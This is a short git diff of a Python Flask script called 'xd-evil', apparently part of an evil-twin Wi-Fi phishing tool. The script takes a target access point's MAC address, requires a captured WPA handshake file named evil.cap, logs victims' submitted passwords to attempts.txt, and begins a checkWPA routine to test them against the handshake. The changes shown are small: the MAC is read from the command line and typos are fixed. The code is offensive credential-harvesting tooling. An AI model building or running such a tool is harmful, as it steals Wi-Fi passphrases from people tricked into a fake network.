@@ -1,11 +1,12 @@
 from flask import Flask, request,jsonify, json, make_response
 from subprocess import run, PIPE
 import time,os
+import sys
 
-target = 'CC:2D:21:61:71:58'
+target = sys.argv[1]
 
 if len(target) != 17:
-   print('[ERROR] wrong target mac address should be 17 character')
+   print('[ERROR] MAC address should be 17 characters')
    exit(1)
 if not 'evil.cap' in os.listdir():
    print(f'[ERROR] evil.cap not found copy your target handshake in current folder {os.getcwd()} and name it evil.cap')
@@ -13,8 +14,8 @@ if not 'evil.cap' in os.listdir():
 
 app = Flask('xd-evil')
 logpass = open('attempts.txt','a')
-print('Any Attemps will be saved HERE\n\n\n', file=logpass)
-print('[INFO] Any Attemps will be saved in attempts.txt')
+print('Any Attempts will be saved HERE\n\n\n', file=logpass)
+print('[INFO] Any Attempts will be saved in attempts.txt')
 
 def checkWPA(passw):
     wrdl = open('password.txt','w')
